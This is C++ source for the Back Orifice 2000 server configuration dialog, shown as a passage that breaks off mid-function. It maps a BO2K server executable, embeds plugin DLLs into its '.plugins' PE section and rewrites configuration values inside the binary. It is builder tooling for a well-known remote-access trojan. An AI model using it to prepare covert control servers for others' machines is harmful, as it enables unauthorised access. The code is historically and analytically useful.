/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */


// bo2kcfgDlg.cpp : implementation file
//

#include"stdafx.h"
#include"bo2kcfg.h"
#include"bo2kcfgDlg.h"
#include<winnt.h>
#include<bocomreg.h>
#include<encryption.h>
#include<iohandler.h>
#include<plugins.h>
#include<dll_load.h>
#include"Wizard1.h"
#include"Wizard2.h"
#include"Wizard3.h"
#include"Wizard4.h"
#include"Wizard5.h"
#include"Wizard6.h"
#include"Wizard7.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define ROUND_TO(p,num) ((p%num)?(((p/num)+1)*num):p)

/////////////////////////////////////////////////////////////////////////////
// CBo2kcfgDlg dialog

CBo2kcfgDlg::CBo2kcfgDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CBo2kcfgDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBo2kcfgDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	
	m_hLargeIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_hSmallIcon = AfxGetApp()->LoadIcon(IDI_LITTLECOW);
	m_hButtWizard = AfxGetApp()->LoadIcon(IDI_BUTTWIZARD);
	
	m_hSvrMapping=NULL;
	m_pSvrView=NULL;
	m_arrPluginInfo.RemoveAll();
	m_arrVarInfo.RemoveAll();
}

void CBo2kcfgDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBo2kcfgDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CBo2kcfgDlg, CDialog)
	//{{AFX_MSG_MAP(CBo2kcfgDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_OPENSERVER, OnOpenserver)
	ON_BN_CLICKED(IDC_CLOSESERVER, OnCloseserver)
	ON_BN_CLICKED(IDC_INSERT, OnInsert)
	ON_BN_CLICKED(IDC_SAVESERVER, OnSaveserver)
	ON_BN_CLICKED(IDC_REMOVE, OnRemove)
	ON_NOTIFY(TVN_SELCHANGED, IDC_OPTIONVARIABLES, OnSelchangedOptionvariables)
	ON_BN_CLICKED(IDC_BOOL_DISABLED, OnBoolDisabled)
	ON_BN_CLICKED(IDC_BOOL_ENABLED, OnBoolEnabled)
	ON_BN_CLICKED(IDC_SETVALUE, OnSetvalue)
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_EXTRACT, OnExtract)
	ON_BN_CLICKED(IDC_WIZARD, OnWizard)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBo2kcfgDlg message handlers

BOOL CBo2kcfgDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hLargeIcon, TRUE);			// Set big icon
	SetIcon(m_hSmallIcon, FALSE);		// Set small icon
	
	::SendMessage(GetDlgItem(IDC_WIZARD)->GetSafeHwnd(),BM_SETIMAGE,(WPARAM)IMAGE_ICON,(LPARAM)m_hButtWizard);

	// Disable controls initially
	EnableControls(FALSE);

	m_ImgList.Create(IDB_IMGLIST,16,1,RGB(0,255,0));

	CListCtrl *pLC=((CListCtrl *)GetDlgItem(IDC_PLUGINS));
	pLC->InsertColumn(0,"Plugin Name",LVCFMT_LEFT,100,-1);
	pLC->InsertColumn(1,"Version",LVCFMT_LEFT,48,-1);
	pLC->InsertColumn(2,"BO2K Ver",LVCFMT_LEFT,60,-1);
	pLC->InsertColumn(3,"Description",LVCFMT_LEFT,200,-1);
	pLC->SetImageList(&m_ImgList,LVSIL_SMALL);
	pLC->SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP);

	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);
	pTC->SetImageList(&m_ImgList,TVSIL_NORMAL);

	// Do wizard on startup?
	BOOL bStartWiz=AfxGetApp()->GetProfileInt("Startup","Wizard",TRUE);
	if(bStartWiz) {
		DoWizard();		
	}
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CBo2kcfgDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hSmallIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CBo2kcfgDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hSmallIcon;
}

void CBo2kcfgDlg::OnOpenserver() 
{
	CFileDialog cfd(TRUE,".exe",NULL,OFN_FILEMUSTEXIST|OFN_HIDEREADONLY,"Executable Files (*.exe)|*.exe|All Files (*.*)|*.*||",this); 

	if(cfd.DoModal()==IDOK) {
		if(IsValidServer(cfd.GetPathName())) {
			if(!OpenServer(cfd.GetPathName())) {
				AfxMessageBox("The BO2K server you have selected could not be loaded.");
			}
		} else {
			AfxMessageBox("The file you selected is not a BO2K server.");
		}
	}
}

void CBo2kcfgDlg::EnableControls(BOOL bEnable)
{
	// Deselect All List/Tree Controls
	
	((CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES))->SelectItem(NULL);
	((CListCtrl *)GetDlgItem(IDC_PLUGINS))->SetSelectionMark(-1);

	// Enable/Disable Controls
	
	GetDlgItem(IDC_SAVESERVER)->EnableWindow(bEnable);
	GetDlgItem(IDC_CLOSESERVER)->EnableWindow(bEnable);
	GetDlgItem(IDC_STATIC1)->EnableWindow(bEnable);
	GetDlgItem(IDC_STATIC2)->EnableWindow(bEnable);
	GetDlgItem(IDC_STATIC_NEWVAL)->EnableWindow(FALSE);
	GetDlgItem(IDC_STATIC_CURVAL)->EnableWindow(FALSE);
	GetDlgItem(IDC_PLUGINS)->EnableWindow(bEnable);
	GetDlgItem(IDC_OPTIONVARIABLES)->EnableWindow(bEnable);
	GetDlgItem(IDC_STR_NEWVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_STR_CURRENTVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_SETVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_ENABLED)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_DISABLED)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_GROUP)->EnableWindow(FALSE);
	GetDlgItem(IDC_INSERT)->EnableWindow(bEnable);
	GetDlgItem(IDC_REMOVE)->EnableWindow(bEnable);
	GetDlgItem(IDC_EXTRACT)->EnableWindow(bEnable);
}

BOOL CBo2kcfgDlg::IsValidPlugin(LPCSTR svPath)
{
	HMODULE hMod;
	
	hMod=LoadDLL(svPath);
	if(hMod==NULL) return FALSE;

	if(GetDLLProcAddress(hMod,"InstallPlugin")==NULL) {
		FreeDLL(hMod);
		return FALSE;
	}

	FreeDLL(hMod);
	return TRUE;
}


BOOL CBo2kcfgDlg::IsValidServer(LPCSTR svPath)
{
	HMODULE hMod;
	hMod=LoadLibrary(svPath);
	if(hMod==NULL) return FALSE;

	BYTE *pImage=(BYTE *)hMod;

	// Get PE Header
	PIMAGE_FILE_HEADER pfh;
	pfh=(PIMAGE_FILE_HEADER) PEFHDROFFSET(pImage);
	
	// Get Section Count
	int nSectionCount;
	nSectionCount=pfh->NumberOfSections;

	// Get Section Header
	PIMAGE_SECTION_HEADER psh;
    psh = (PIMAGE_SECTION_HEADER)SECHDROFFSET (pImage);
	
	// Find the ".plugins" segment
	int i;
	for(i=0;i<nSectionCount;i++) {
		if( (*((DWORD *)(psh->Name))==0x756C702E) &&
			(*(((DWORD *)(psh->Name))+1)==0x736E6967) ) {
			break;
		}
		psh++;
	}
	if(i==nSectionCount) {
		FreeModule(hMod);
		return FALSE;
	}

	FreeModule(hMod);
	return TRUE;
}


BOOL CBo2kcfgDlg::OpenServer(LPCSTR svPath)
{
	// Close server if currently open
	CloseServer();	

	// Open server file
	HANDLE hSvrFile;
	m_strSvrPath=svPath;
	hSvrFile=CreateFile(svPath,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
	if(hSvrFile==NULL) return FALSE;
	m_dwRawFileSize=GetFileSize(hSvrFile,NULL);
	
	// Memory map it
	BYTE *pImage;
	m_hSvrMapping=CreateFileMapping(hSvrFile,NULL,PAGE_READWRITE,0,0,NULL);
	CloseHandle(hSvrFile);
	if(m_hSvrMapping==NULL) return FALSE;
	
	m_pSvrView=(BYTE *)MapViewOfFile(m_hSvrMapping,FILE_MAP_ALL_ACCESS,0,0,0);
	pImage=(BYTE *)m_pSvrView;
	if(pImage==NULL) {
		CloseHandle(m_hSvrMapping);
		m_hSvrMapping=NULL;
		return FALSE;
	}

	// Get PE Header and Optional Header
	PIMAGE_FILE_HEADER pfh;
	PIMAGE_OPTIONAL_HEADER poh;
	pfh=(PIMAGE_FILE_HEADER) PEFHDROFFSET(pImage);
	poh=(PIMAGE_OPTIONAL_HEADER) OPTHDROFFSET(pImage);

	m_dwRawLength=poh->SizeOfImage;

	// Get Section Count
	int nSectionCount;
	nSectionCount=pfh->NumberOfSections;

	// Get Section Header
	PIMAGE_SECTION_HEADER psh;
    psh = (PIMAGE_SECTION_HEADER)SECHDROFFSET (pImage);
	
	// Find the ".plugins" segment
	int i;
	for(i=0;i<nSectionCount;i++) {
		if( (*((DWORD *)(psh->Name))==0x756C702E) &&
			(*(((DWORD *)(psh->Name))+1)==0x736E6967) ) {
			break;
		}
		psh++;
	}
	if(i==nSectionCount) {
		CloseHandle(m_hSvrMapping);
		m_hSvrMapping=NULL;
		return FALSE;
	}
	
	// Get plugin header
	PATTACHMENT_HEADER pah;
	pah = (PATTACHMENT_HEADER)RVATOVA(pImage,psh->PointerToRawData);
	
	// Get a copy of each plugin
	int count;
	
	count=pah->nNumPlugins;
	if(count>0) {
		BYTE *pPlugin;
		DWORD dwSize,dwAtchLen;
		
		pPlugin=(((BYTE *)pah)+sizeof(ATTACHMENT_HEADER));
		dwAtchLen=sizeof(ATTACHMENT_HEADER);
		for(i=0;i<count;i++) {
		
			// Get plugin size
			dwSize=*((DWORD *)pPlugin);
			pPlugin+=sizeof(DWORD);
	
			// Insert plugin into list
			InsertPlugin(pPlugin,dwSize);
			
			dwAtchLen+=(dwSize+sizeof(DWORD));
			
			// Go to next plugin
			pPlugin+=dwSize;
		}
		dwAtchLen=ROUND_TO(dwAtchLen,4096);
		m_dwRawLength-=dwAtchLen;
		m_dwRawFileSize-=dwAtchLen;
	} else {
		m_dwRawLength-=4096;
		m_dwRawFileSize-=4096;
	}
	
	// Update dialog controls
	
	EnableControls(TRUE);
	GetDlgItem(IDC_FILENAME)->SetWindowText(svPath);

	CString str;
	str.Format("Server Info:\n     Version %d.%d\n",poh->MajorImageVersion,poh->MinorImageVersion);
	GetDlgItem(IDC_SERVERINFO)->SetWindowText(str);

	UpdateVariableList();
	
	return TRUE;
}

void CBo2kcfgDlg::CloseServer()
{
	// Clear filename
	m_strSvrPath.Empty();

	// Close file mapping
	if(m_pSvrView!=NULL) {
		UnmapViewOfFile(m_pSvrView);
		m_pSvrView=NULL;
	}
	
	if(m_hSvrMapping!=NULL) {
		CloseHandle(m_hSvrMapping);
		m_hSvrMapping=NULL;
	}

	// Get plugins out of memory
	int i,count;
	count=m_arrPluginInfo.GetSize();
	for(i=0;i<count;i++) {
		PLUGIN_INFO pi;
		pi=m_arrPluginInfo.GetAt(i);
		free(pi.pPluginImage);
	}	
	m_arrPluginInfo.RemoveAll();

	// Update dialog controls

	CListCtrl *pLC=((CListCtrl *)GetDlgItem(IDC_PLUGINS));
	pLC->DeleteAllItems();

	GetDlgItem(IDC_SERVERINFO)->SetWindowText("Server Info:");
	GetDlgItem(IDC_FILENAME)->SetWindowText("");
	EnableControls(FALSE);

	UpdateVariableList();
}

void CBo2kcfgDlg::OnCloseserver() 
{
	CloseServer();	
}

void CBo2kcfgDlg::OnInsert() 
{
	CFileDialog cfd(TRUE,".dll",NULL,OFN_PATHMUSTEXIST | OFN_HIDEREADONLY,"DLL Files (*.dll)|*.dll|All Files (*.*)|*.*||",this);
	cfd.m_ofn.lpstrTitle="Insert BO2K Plugin";

	if(cfd.DoModal()==IDOK) {
		if(IsValidPlugin(cfd.GetPathName())) {
			BYTE *pPlugin;
			DWORD dwSize;
			CFile file;
			if(file.Open(cfd.GetPathName(),CFile::typeBinary)) {
				dwSize=file.GetLength();
				pPlugin=(BYTE *)malloc(dwSize);
				if(pPlugin==NULL) return;
				file.Read(pPlugin,dwSize);				
				file.Close();

				InsertPlugin(pPlugin,dwSize);
				
				free(pPlugin);
			}
		} else {
			AfxMessageBox("The specified file is not a valid BO2K plugin");
		}
	}
}

BOOL CBo2kcfgDlg::InsertPlugin(BYTE *pPlugin, DWORD dwSize)
{	
	// Copy allocate plugin image
	PLUGIN_INFO pi;
	pi.pPluginImage=(BYTE *) malloc(dwSize);
	pi.dwPluginLen=dwSize;
	
	if(pi.pPluginImage!=NULL) {
		// Copy plugin image to save buffer
		memcpy(pi.pPluginImage,pPlugin,pi.dwPluginLen);
		
		pi.svFilename[0]=0;
		pi.svDescription[0]=0;
		pi.wVersionLo=0;
		pi.wVersionHi=0;
		pi.wBOVersionLo=0;
		pi.wBOVersionHi=0;
		
		// Load Plugin DLL
		HINSTANCE hDLL;
		hDLL=LoadDLLFromImage(pPlugin,NULL,0);
		if(hDLL!=NULL) {
			// Call plugin version information function
			PLUGIN_VERSION pv;
			TYPEOF_PluginVersion *PluginVersion=(TYPEOF_PluginVersion *)GetDLLProcAddress(hDLL,"PluginVersion");
			if(PluginVersion!=NULL) {
				if(PluginVersion(&pv)) {
					// Copy plugin version information
					lstrcpyn(pi.svFilename,pv.svFilename,MAX_PATH+1);
					lstrcpyn(pi.svDescription,pv.svDescription,256);
					pi.wVersionLo=pv.wVersionLo;
					pi.wVersionHi=pv.wVersionHi;
					pi.wBOVersionLo=pv.wBOVersionLo;
					pi.wBOVersionHi=pv.wBOVersionHi;
				}
			}
			FreeDLL(hDLL);
		}
		
		// Add to plugins array
		int nPos=m_arrPluginInfo.Add(pi);

		// Insert into control
		CString str;
		CListCtrl *pLC=((CListCtrl *)GetDlgItem(IDC_PLUGINS));
		pLC->InsertItem(nPos,pi.svFilename,0);
		str.Format("%d.%d",pi.wVersionHi,pi.wVersionLo);
		pLC->SetItem(nPos,1,LVIF_TEXT,str,0,0,0,0);
		str.Format("%d.%d",pi.wBOVersionHi,pi.wBOVersionLo);
		pLC->SetItem(nPos,2,LVIF_TEXT,str,0,0,0,0);
		pLC->SetItem(nPos,3,LVIF_TEXT,pi.svDescription,0,0,0,0);

		// Update variable list

		UpdateVariableList();
	
		return TRUE;
	}
	return FALSE;
}

void CBo2kcfgDlg::OnSaveserver() 
{
	if(!SaveServer()) {
		AfxMessageBox("There was a problem saving the server file.");
	} else {
		AfxMessageBox("Server file saved",MB_OK|MB_ICONINFORMATION|MB_TOPMOST|MB_SETFOREGROUND);
	}
}

void CBo2kcfgDlg::OnOK() 
{
}

void CBo2kcfgDlg::OnCancel() 
{
}

void CBo2kcfgDlg::OnRemove() 
{
	// Get Selected List Item
	CListCtrl *pLC=((CListCtrl *)GetDlgItem(IDC_PLUGINS));
	int nItem;
	nItem=pLC->GetSelectionMark();
	if(nItem==-1) return;
	
	// Get plugin out of memory
	PLUGIN_INFO pi;
	pi=m_arrPluginInfo.GetAt(nItem);
	free(pi.pPluginImage);
	m_arrPluginInfo.RemoveAt(nItem);
	
	// Remove List Item
	pLC->DeleteItem(nItem);

	// Update variable list
	UpdateVariableList();
}

BOOL CBo2kcfgDlg::SaveServer()
{
	// ------- Adjust length of file and append new plugins --------
	int i,count;
	DWORD dwAtchLen;

	count=m_arrPluginInfo.GetSize();
	
	// Close file mapping
	UnmapViewOfFile(m_pSvrView);

	if(m_hSvrMapping!=NULL) {
		CloseHandle(m_hSvrMapping);
		m_hSvrMapping=NULL;
	}

	// Open File and truncate length
	CFile sf(m_strSvrPath,CFile::modeWrite|CFile::typeBinary);
	sf.SetLength(m_dwRawFileSize);
		
	if(count>0) {
		// Append number of plugins
		dwAtchLen=sizeof(ATTACHMENT_HEADER);
		ATTACHMENT_HEADER ah;
		ah.nNumPlugins=count;
		sf.Write(&ah,sizeof(ATTACHMENT_HEADER));
	
		// Append plugins
		for(i=0;i<count;i++) {
			dwAtchLen+=(m_arrPluginInfo[i].dwPluginLen+sizeof(ATTACHMENT_INDEX));
			
			// Append plugin index
			ATTACHMENT_INDEX ai;
			ai.dwPluginSize=m_arrPluginInfo[i].dwPluginLen;
			sf.Write(&ai,sizeof(ATTACHMENT_INDEX));
			
			// Append plugin
			sf.Write(m_arrPluginInfo[i].pPluginImage,ai.dwPluginSize);
		}

		// Round to nearest 4096 boundary
		DWORD dwWrite=dwAtchLen;
		dwAtchLen=ROUND_TO(dwAtchLen,4096);
		dwWrite=dwAtchLen-dwWrite;
		BYTE bNull=0;
		for(i=0;(DWORD)i<dwWrite;i++) {
			sf.Write(&bNull,1);
		}
	} else {
		// Empty segment
		BYTE bNull=0;
		for(i=0;i<4096;i++) {
			sf.Write(&bNull,1);
		}
		dwAtchLen=4096;
	}
		
	// Close file
	sf.Close();
	
	// Reopen file mapping objects
	HANDLE hSvrFile;
	hSvrFile=CreateFile(m_strSvrPath,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
	if(hSvrFile==NULL) return FALSE;
	
	// Memory map it
	BYTE *pImage;
	m_hSvrMapping=CreateFileMapping(hSvrFile,NULL,PAGE_READWRITE,0,0,NULL);
	CloseHandle(hSvrFile);
	if(m_hSvrMapping==NULL) return FALSE;
	
	m_pSvrView=(BYTE *)MapViewOfFile(m_hSvrMapping,FILE_MAP_ALL_ACCESS,0,0,0);
	pImage=(BYTE *)m_pSvrView;
	if(pImage==NULL) {
		CloseHandle(m_hSvrMapping);
		m_hSvrMapping=NULL;
		return FALSE;
	}
	
	// Get PE Header and Optional Header
	PIMAGE_FILE_HEADER pfh;
	PIMAGE_OPTIONAL_HEADER poh;
	pfh=(PIMAGE_FILE_HEADER) PEFHDROFFSET(pImage);
	poh=(PIMAGE_OPTIONAL_HEADER) OPTHDROFFSET(pImage);
	
	// Get Section Count
	int nSectionCount;
	nSectionCount=pfh->NumberOfSections;

	// Get Section Header
	PIMAGE_SECTION_HEADER psh;
	psh = (PIMAGE_SECTION_HEADER)SECHDROFFSET (pImage);
	
	// Find the ".plugins" segment
	for(i=0;i<nSectionCount;i++) {
		if( (*((DWORD *)(psh->Name))==0x756C702E) &&
			(*(((DWORD *)(psh->Name))+1)==0x736E6967) ) {
			break;
		}
		psh++;
	}
	if(i==nSectionCount) {
		CloseHandle(m_hSvrMapping);
		m_hSvrMapping=NULL;
		return FALSE;
	}

	// Modify '.plugins' section to include proper length
	psh->SizeOfRawData=dwAtchLen;
	psh->Misc.VirtualSize=dwAtchLen;

	// Change length of file appropriately.
	poh->SizeOfImage=m_dwRawLength+dwAtchLen;
	
	FlushViewOfFile(m_pSvrView,0);
	
	return TRUE;
}

void CBo2kcfgDlg::UpdateVariableList()
{
	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);

	pTC->DeleteAllItems();
	m_arrVarInfo.RemoveAll();

	// Add server config options
	if(m_pSvrView!=NULL) {
		AddVariables((char *)m_pSvrView,m_dwRawFileSize,-1);
	}

	// Add options for all plugins
	int i,count;

	count=m_arrPluginInfo.GetSize();
	for(i=0;i<count;i++) {
		AddVariables((char *)m_arrPluginInfo[i].pPluginImage,m_arrPluginInfo[i].dwPluginLen,i);
	}
	
	// Add option variables to tree control
	count=m_arrVarInfo.GetSize();
	for(i=0;i<count;i++) {
		VARIABLE_INFO vi=m_arrVarInfo.GetAt(i);
		HTREEITEM hti;

		// Find category item
		hti=pTC->GetRootItem();
		while(hti!=NULL) {
			if(pTC->GetItemText(hti).Compare(vi.svCategory)==0) break;
			hti=pTC->GetNextSiblingItem(hti);
		}
		if(hti==NULL) {
			if(vi.nPlugin==-1) {
				hti=pTC->InsertItem(vi.svCategory,4,5);
			} else {
				hti=pTC->InsertItem(vi.svCategory,6,7);
			}
			pTC->SetItemData(hti,0xFFFFFFFF);
		}
		int nImg;
		if(vi.VarType=='B') nImg=3;
		else if(vi.VarType=='N') nImg=2;
		else if(vi.VarType=='S') nImg=1;

		hti=pTC->InsertItem(vi.svVarName,nImg,nImg,hti);
		pTC->SetItemData(hti,i);
	}
}

void CBo2kcfgDlg::AddVariables(char *pBuffer, DWORD dwLen, int nPlugin)
{
	DWORD pos;
	for(pos=0;pos<dwLen-9;pos++) {
		if(memcmp(pBuffer+pos,"<**CFG**>",9)==0) {
			pos+=9;
			// Get category name
			VARIABLE_INFO vi;
			lstrcpyn(vi.svCategory,pBuffer+pos,256);
			pos+=(lstrlen(pBuffer+pos)+1);
			
			// Go through all variables
			while(*(pBuffer+pos)!='\0') {
				DWORD dwValPos;
				vi.VarType=*(pBuffer+pos);
				if(vi.VarType=='B') {
					pos+=2;
					// Get Name and Value
					DWORD dwStart=pos;
					while(*(pBuffer+pos)!='=') pos++;
					lstrcpyn(vi.svVarName,pBuffer+dwStart,min(pos-dwStart+1,256));
					pos++;
					dwValPos=pos;
					lstrcpyn(vi.svVarValue,pBuffer+pos,256);
					vi.nStrLen=1;
					pos+=2;
				} else if(vi.VarType=='N') {
					// Get Number Range
					pos+=2;
					vi.nNumLo=atoi(pBuffer+pos);
					while(*(pBuffer+pos)!=',') pos++;
					pos++;
					vi.nStrLen=pos;
					vi.nNumHi=atoi(pBuffer+pos);
					while(*(pBuffer+pos)!=']') pos++;
					vi.nStrLen=pos-vi.nStrLen;
					pos+=2;
					
					// Get Name and Value
					DWORD dwStart=pos;
					while(*(pBuffer+pos)!='=') pos++;
					lstrcpyn(vi.svVarName,pBuffer+dwStart,min(pos-dwStart+1,256));
					pos++;
					dwValPos=pos;
					lstrcpyn(vi.svVarValue,pBuffer+pos,256);
					pos+=(vi.nStrLen+1);
				} else if(vi.VarType=='S') {
					// Get Number Range
					pos+=2;
					vi.nStrLen=atoi(pBuffer+pos);
					while(*(pBuffer+pos)!=']') pos++;
					pos+=2;
					
					// Get Name and Value
					DWORD dwStart=pos;
					while(*(pBuffer+pos)!='=') pos++;
					lstrcpyn(vi.svVarName,pBuffer+dwStart,min(pos-dwStart+1,256));
					pos++;
					lstrcpyn(vi.svVarValue,pBuffer+pos,256);
					dwValPos=pos;
					pos+=(vi.nStrLen+1);
				} else {
					AfxMessageBox("Error parsing variables. Variable list could not be determined.");
					return;
				}
				
				// Add to variable info array
				vi.nPlugin=nPlugin;
				vi.dwPos=dwValPos;
				m_arrVarInfo.Add(vi);
				
			}
		}
	}

}

void CBo2kcfgDlg::OnSelchangedOptionvariables(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NMTREEVIEW *pNMTreeView = (NMTREEVIEW*)pNMHDR;

	// Hide all option controls
	GetDlgItem(IDC_STATIC_NEWVAL)->EnableWindow(FALSE);
	GetDlgItem(IDC_STATIC_CURVAL)->EnableWindow(FALSE);
	GetDlgItem(IDC_STR_NEWVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_STR_CURRENTVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_SETVALUE)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_ENABLED)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_DISABLED)->EnableWindow(FALSE);
	GetDlgItem(IDC_BOOL_GROUP)->EnableWindow(FALSE);

	if(pNMTreeView->itemNew.hItem!=NULL) {
		int nVar=pNMTreeView->itemNew.lParam;
		if(nVar!=0xFFFFFFFF) {	
			if(m_arrVarInfo[nVar].VarType=='B') {
				GetDlgItem(IDC_BOOL_GROUP)->EnableWindow();
				GetDlgItem(IDC_BOOL_ENABLED)->EnableWindow();
				GetDlgItem(IDC_BOOL_DISABLED)->EnableWindow();
				
				if(atoi(m_arrVarInfo[nVar].svVarValue)) {
					((CButton *)GetDlgItem(IDC_BOOL_ENABLED))->SetCheck(1);
					((CButton *)GetDlgItem(IDC_BOOL_DISABLED))->SetCheck(0);
				} else {
					((CButton *)GetDlgItem(IDC_BOOL_DISABLED))->SetCheck(1);
					((CButton *)GetDlgItem(IDC_BOOL_ENABLED))->SetCheck(0);
				}
				
			} else if(m_arrVarInfo[nVar].VarType=='N') {
				GetDlgItem(IDC_STATIC_NEWVAL)->EnableWindow();
				GetDlgItem(IDC_STATIC_CURVAL)->EnableWindow();
				GetDlgItem(IDC_STR_NEWVALUE)->EnableWindow();
				GetDlgItem(IDC_STR_CURRENTVALUE)->EnableWindow();
				GetDlgItem(IDC_SETVALUE)->EnableWindow();
				GetDlgItem(IDC_STR_CURRENTVALUE)->SetWindowText(m_arrVarInfo[nVar].svVarValue);
				GetDlgItem(IDC_STR_NEWVALUE)->SetWindowText("");
				((CEdit *)GetDlgItem(IDC_STR_CURRENTVALUE))->SetLimitText(m_arrVarInfo[nVar].nStrLen);
				((CEdit *)GetDlgItem(IDC_STR_NEWVALUE))->SetLimitText(m_arrVarInfo[nVar].nStrLen);
				GetDlgItem(IDC_STR_CURRENTVALUE)->ModifyStyle(0,ES_NUMBER);
				GetDlgItem(IDC_STR_NEWVALUE)->ModifyStyle(0,ES_NUMBER);
			} else if(m_arrVarInfo[nVar].VarType=='S') {
				GetDlgItem(IDC_STATIC_NEWVAL)->EnableWindow();
				GetDlgItem(IDC_STATIC_CURVAL)->EnableWindow();
				GetDlgItem(IDC_STR_NEWVALUE)->EnableWindow();
				GetDlgItem(IDC_STR_CURRENTVALUE)->EnableWindow();
				GetDlgItem(IDC_SETVALUE)->EnableWindow();
				GetDlgItem(IDC_STR_CURRENTVALUE)->SetWindowText(m_arrVarInfo[nVar].svVarValue);
				GetDlgItem(IDC_STR_NEWVALUE)->SetWindowText("");
				((CEdit *)GetDlgItem(IDC_STR_CURRENTVALUE))->SetLimitText(m_arrVarInfo[nVar].nStrLen);
				((CEdit *)GetDlgItem(IDC_STR_NEWVALUE))->SetLimitText(m_arrVarInfo[nVar].nStrLen);
				GetDlgItem(IDC_STR_CURRENTVALUE)->ModifyStyle(ES_NUMBER,0);
				GetDlgItem(IDC_STR_NEWVALUE)->ModifyStyle(ES_NUMBER,0);				
			}
		}
	}

	*pResult = 0;
}

void CBo2kcfgDlg::OnBoolDisabled() 
{
	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);

	HTREEITEM hti=pTC->GetSelectedItem();
	int nVar=pTC->GetItemData(hti);
	if(nVar!=0xFFFFFFFF) {
		m_arrVarInfo[nVar].svVarValue[0]='0';

		// Set into image
		VARIABLE_INFO vi=m_arrVarInfo[nVar];
		char *ptr;
		DWORD pos;
		if(vi.nPlugin>=0) {
			PLUGIN_INFO pi=m_arrPluginInfo[vi.nPlugin];
			ptr=(char *)pi.pPluginImage;
		} else {
			ptr=(char *)m_pSvrView;
		}
		pos=vi.dwPos;
		memset(ptr+pos,0,vi.nStrLen+1);
		memcpy(ptr+pos,vi.svVarValue,lstrlen(vi.svVarValue));

	}
}

void CBo2kcfgDlg::OnBoolEnabled() 
{
	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);

	HTREEITEM hti=pTC->GetSelectedItem();
	int nVar=pTC->GetItemData(hti);
	if(nVar!=0xFFFFFFFF) {
		m_arrVarInfo[nVar].svVarValue[0]='1';

		// Set into image
		VARIABLE_INFO vi=m_arrVarInfo[nVar];
		char *ptr;
		DWORD pos;
		if(vi.nPlugin>=0) {
			PLUGIN_INFO pi=m_arrPluginInfo[vi.nPlugin];
			ptr=(char *)pi.pPluginImage;
		} else {
			ptr=(char *)m_pSvrView;
		}
		pos=vi.dwPos;
		memset(ptr+pos,0,vi.nStrLen+1);
		memcpy(ptr+pos,vi.svVarValue,lstrlen(vi.svVarValue));
	}
}

void CBo2kcfgDlg::OnSetvalue()
{
	CTreeCtrl *pTC=(CTreeCtrl *)GetDlgItem(IDC_OPTIONVARIABLES);

	HTREEITEM hti=pTC->GetSelectedItem();
	int nVar=pTC->GetItemData(hti);
	if(nVar!=0xFFFFFFFF) {
		CString str;
		GetDlgItem(IDC_STR_NEWVALUE)->GetWindowText(str);
		if(m_arrVarInfo[nVar].VarType=='N') {
			int nValue=atoi(str);
